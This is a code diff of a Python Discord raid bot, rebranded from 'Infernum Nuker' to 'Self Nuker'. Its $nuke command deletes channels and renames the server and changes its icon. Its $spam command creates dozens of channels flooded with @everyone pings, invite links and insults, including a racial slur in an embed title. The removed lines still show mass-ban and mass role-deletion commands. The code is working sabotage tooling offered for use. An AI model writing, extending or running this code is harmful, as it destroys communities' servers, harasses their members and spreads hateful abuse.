@@ -7,6 +7,7 @@ from time import sleep
 from colorama import Fore, Back, Style
 from discord.ext import commands, tasks
 import aiohttp
+import requests
 from colorama import Fore, Back, Style, init
 
 intents = discord.Intents.default()
@@ -19,24 +20,21 @@ bot = commands.Bot(command_prefix='$', intents=intents)
 init(autoreset=True)
 
 ascii_art = Fore.MAGENTA + r"""
-$$$$$$\            $$$$$$\                                                             $$\   $$\           $$\                           
-\_$$  _|          $$  __$$\                                                            $$$\  $$ |          $$ |                          
-  $$ |  $$$$$$$\  $$ /  \__|$$$$$$\   $$$$$$\  $$$$$$$\  $$\   $$\ $$$$$$\$$$$\        $$$$\ $$ |$$\   $$\ $$ |  $$\  $$$$$$\   $$$$$$\  
-  $$ |  $$  __$$\ $$$$\    $$  __$$\ $$  __$$\ $$  __$$\ $$ |  $$ |$$  _$$  _$$\       $$ $$\$$ |$$ |  $$ |$$ | $$  |$$  __$$\ $$  __$$\ 
-  $$ |  $$ |  $$ |$$  _|   $$$$$$$$ |$$ |  \__|$$ |  $$ |$$ |  $$ |$$ / $$ / $$ |      $$ \$$$$ |$$ |  $$ |$$$$$$  / $$$$$$$$ |$$ |  \__|
-  $$ |  $$ |  $$ |$$ |     $$   ____|$$ |      $$ |  $$ |$$ |  $$ |$$ | $$ | $$ |      $$ |\$$$ |$$ |  $$ |$$  _$$<  $$   ____|$$ |      
-$$$$$$\ $$ |  $$ |$$ |     \$$$$$$$\ $$ |      $$ |  $$ |\$$$$$$  |$$ | $$ | $$ |      $$ | \$$ |\$$$$$$  |$$ | \$$\ \$$$$$$$\ $$ |      
-\______|\__|  \__|\__|      \_______|\__|      \__|  \__| \______/ \__| \__| \__|      \__|  \__| \______/ \__|  \__| \_______|\__|      
-                                                                                                                                                                    
-:: Infernum commands ::
+  /$$$$$$            /$$  /$$$$$$        /$$   /$$           /$$                                
+ /$$__  $$          | $$ /$$__  $$      | $$$ | $$          | $$                                
+| $$  \__/  /$$$$$$ | $$| $$  \__/      | $$$$| $$ /$$   /$$| $$   /$$  /$$$$$$   /$$$$$$       
+|  $$$$$$  /$$__  $$| $$| $$$$          | $$ $$ $$| $$  | $$| $$  /$$/ /$$__  $$ /$$__  $$      
+ \____  $$| $$$$$$$$| $$| $$_/          | $$  $$$$| $$  | $$| $$$$$$/ | $$$$$$$$| $$  \__/      
+ /$$  \ $$| $$_____/| $$| $$            | $$\  $$$| $$  | $$| $$_  $$ | $$_____/| $$            
+|  $$$$$$/|  $$$$$$$| $$| $$            | $$ \  $$|  $$$$$$/| $$ \  $$|  $$$$$$$| $$            
+ \______/  \_______/|__/|__/            |__/  \__/ \______/ |__/  \__/ \_______/|__/       
+                                                                                                      
+:: Self Commands ::
 *nuke     - Nuke server
-*banall   - Bans all members
 *spam     - Spams channels
-*rol      - Create roles
-*drol     - Delete roles
 *helpm    - all the commands
 
-Infernum Nuker V1
+Self Nuker V1
 By - ils
 """
 
@@ -50,24 +48,43 @@ async def spam(ctx):
         pass
 
     new_message = (
-        "||@everyone @here|| `Join ifs:` https://discord.gg/NCEun68ZZp\n"
+        "||@everyone @here|| `Join dc:` discord.gg/ZW9fQksY6F\n"
         "https://media.discordapp.net/attachments/1353088681321304196/1353251069387603989/elnene.gif\n"
-        "F = Anormal de mierda, infernum on top! \n"
+        "F = Anormal de mierda, Self on top! \n"
     )
+
+    embed_message = discord.Embed(title="MUERETE ANORMAL      ﹒    __Self on Top niggas__", url="https://media.discordapp.net/attachments/1353088681321304196/1353251069387603989/elnene.gif?width=448&height=190")
+    embed_message.set_image(url="https://media.discordapp.net/attachments/1353088681321304196/1353251069387603989/elnene.gif?width=448&height=190")
+
+    channel_names = [
+        "~~SelfPwnedThisShit~~",
+        "~~MuereteAnormal~~",
+        "~~SelfOnTop~~"
+    ]
 
     async def create_channel(name, message_count):
         for _ in range(20):
             try:
                 new_channel = await ctx.guild.create_text_channel(name)
-                tasks = [new_channel.send(new_message) for _ in range(message_count)]
-                await asyncio.gather(*tasks)
+                if name in ["~~SelfPwnedThisShit~~", "~~SelfOnTop~~"]:
+                    for _ in range(message_count):
+                        await new_channel.send("||@everyone @here||")
+                        await new_channel.send(embed=embed_message)
+                        await asyncio.sleep(0.1)
+                else:
+                    tasks = [new_channel.send(new_message) for _ in range(message_count)]
+                    await asyncio.gather(*tasks)
                 await asyncio.sleep(0.1)
-            except:
+            except Exception as e:
+                print(f"")
                 await asyncio.sleep(0.1)
 
-    tasks = [create_channel("Raid-by-infernum", 20) for _ in range(60)]
+    tasks = []
+    for i in range(60):
+        name = channel_names[i % 3]
+        tasks.append(create_channel(name, 20))
+
     await asyncio.gather(*tasks)
-
 
 @bot.command()
 @commands.has_permissions(administrator=True)
@@ -81,7 +98,7 @@ async def nuke(ctx):
     if guild is None:
         return
 
-    image_url = "https://media.discordapp.net/attachments/1294034108401586217/1396867559378387014/bebe.png?ex=687fa5ca&is=687e544a&hm=d9ced0da6c8312b4822304b0cd95023b2b0ad56535cbf18bfc1b97ca58a7e793&=&format=webp&quality=lossless&width=580&height=589"  
+    image_url = "https://media.discordapp.net/attachments/1404343683100184660/1406773688417910834/3f820e399988cc6121a1e405cd96059c.webp?ex=68a45857&is=68a306d7&hm=84fd125cc4cb25dd9050dc1ce34c67c41740073f87fd848bf7b245b6f7d4d3b3&=&format=webp&width=507&height=507"  
 
     try:
         async with aiohttp.ClientSession() as session:
@@ -89,7 +106,7 @@ async def nuke(ctx):
                 if resp.status == 200:
                     icon_bytes = await resp.read()
                     try:
-                        await guild.edit(name="Pwned-by-Infernum", icon=icon_bytes)
+                        await guild.edit(name="selfpwnedthisshit", icon=icon_bytes)
                     except:
                         pass
     except:
@@ -101,70 +118,10 @@ async def nuke(ctx):
         pass
 
     try:
-        await guild.create_text_channel("Raid-By-Infernum")
+        await guild.create_text_channel("Raid-By-Self")
     except:
         pass
-
-
-@bot.command()
-@commands.cooldown(1, 380, commands.BucketType.guild)
-
-async def banall(ctx):
-
-    async def make_banall(member):
-
-        await member.ban()
-
-    tasks = []
-
-    for member in ctx.guild.members:
-
-        task = asyncio.create_task(make_banall(member))
-
-        tasks.append(task)
-
-    await asyncio.gather(*tasks)
-
-
-@bot.command()
-async def rol(ctx):
-    try:
-        await ctx.message.delete()
-    except:
-        pass
-
-    role_name = "PwnedByInfernumSquad"
-
-    async def create_role():
-        try:
-            await ctx.guild.create_role(name=role_name)
-        except:
-            pass
-
-    tasks = [asyncio.create_task(create_role()) for _ in range(50)]
-    await asyncio.gather(*tasks)
-
-
-@bot.command()
-async def drol(ctx):
-    try:
-        await ctx.message.delete()
-    except:
-        pass
-
-    guild = ctx.guild
-
-    async def delete_role(role):
-        try:
-            await role.delete()
-        except (discord.Forbidden, discord.HTTPException):
-            pass
-
-    roles_to_delete = [role for role in guild.roles if role.name != "@everyone"]
-    tasks = [asyncio.create_task(delete_role(role)) for role in roles_to_delete]
-    await asyncio.gather(*tasks)
-
-
+    
 @bot.command()
 async def helpm(ctx):
     try:
@@ -172,18 +129,15 @@ async def helpm(ctx):
     except:
         pass
 
-    embed = discord.Embed(title="`Infernum Squad 亗`", description="", color=0x000001)
+    embed = discord.Embed(title="`Self Rbot 亗`", description="", color=0x000001)
 
-    embed.add_field(name="`• $banall:`", value="Banea a todos los miembros del servidor", inline=False)
     embed.add_field(name="`• $nuke:`", value="Elimina todos los canales y cambia el icono y nombre del servidor.", inline=False)
     embed.add_field(name="`• $spam:`", value="Crea canales y envia spam", inline=False)
-    embed.add_field(name="`• $rol:`", value="Crea 50 roles", inline=False)
-    embed.add_field(name="`• $drol:`", value="Elimina todos los roles", inline=False)
     embed.add_field(name="`• $helpm:`", value="Todos los comandos del bot.", inline=False)
 
     embed.set_footer(text="`Prefix: $`")
     embed.set_footer(text="`Creator bot: ils`")
-    embed.set_footer(text="https://guns.lol/ilsss                                            Best squad, ilswashere on top")
+    embed.set_footer(text="https://guns.lol/ilsss                                            Best Rbot, ilswashere on top")
 
     embed.set_image(url="https://media.discordapp.net/attachments/1353088681321304196/1353251069387603989/elnene.gif")
 
